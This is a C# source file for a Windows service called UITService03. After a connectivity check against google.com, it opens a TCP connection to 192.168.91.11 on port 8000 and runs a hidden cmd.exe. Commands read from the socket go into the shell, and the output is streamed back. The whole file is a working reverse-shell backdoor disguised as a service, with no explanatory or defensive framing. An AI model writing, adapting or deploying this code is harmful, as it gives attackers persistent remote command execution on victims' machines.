using System;
using System.Net;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections;
namespace UITService03
{
    public partial class Service1 : ServiceBase
    {

        static StreamWriter streamWriter;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            ProcessRunning();
        }

        protected override void OnStop()
        {
        }
        private void ProcessRunning()
        {
            HttpWebRequest req = WebRequest.Create("http://google.com/") as HttpWebRequest;
            HttpWebResponse rsp;
            try
            {
                rsp = req.GetResponse() as HttpWebResponse;
            }
            catch (WebException e)
            {
                if (e.Response is HttpWebResponse)
                {
                    rsp = e.Response as HttpWebResponse;
                }
                else
                {
                    rsp = null;
                }
            }
            if (rsp != null)
            {
                if (rsp.StatusCode.ToString()=="OK")
                {
                    WriteToFile("checkkk OK");
                    Action();
                }

            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
            "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
            ".txt";
            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }



        public static void Action()
        {
            using (TcpClient client = new TcpClient("192.168.91.11", 8000))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

    }
}
